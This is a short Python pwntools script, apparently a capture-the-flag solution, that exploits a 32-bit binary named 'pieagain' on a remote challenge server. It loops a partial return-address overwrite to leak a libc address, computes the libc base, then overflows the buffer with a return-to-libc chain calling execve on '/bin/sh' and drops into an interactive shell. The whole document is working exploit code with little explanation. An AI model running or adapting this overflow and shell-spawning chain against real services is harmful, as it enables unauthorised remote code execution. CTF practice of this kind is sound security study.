from pwn import *
from random import choice


elf = ELF('./pieagain')

libc = ELF('libc6_2.23-0ubuntu11.2_i386.so')

rep = 0x2c

# exit(1)
while True:
    io = remote("pwn1.0ops.sjtu.cn", 10008)
    io.recvline()
    io.send(b"A"*31)
    io.recvline()
    print(io.recvline())
    b = choice([i for i in range(16)])
    payload = b'A'*rep + b'\xde\x08' # 0x8de is the start address of write call
    io.sendline(payload)
    try:
        io.recv(4)
        addr = io.recv(4) # return address of main function, which is in _libc_start_main function
        # print(hex(u32(addr))) 
        break
    except:
        continue

_libc_start_main = u32(addr) - 247 # offset of __libc_start_main address and return address of main


print(hex(_libc_start_main))

libc_base = _libc_start_main - libc.symbols['__libc_start_main']

execve = libc.symbols['execve'] + libc_base
bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base

payload = b'A' * rep + p32(execve) + p32(0) + p32(bin_sh) + p32(0) + p32(0)

io.sendline(payload)

io.clean()

io.interactive()
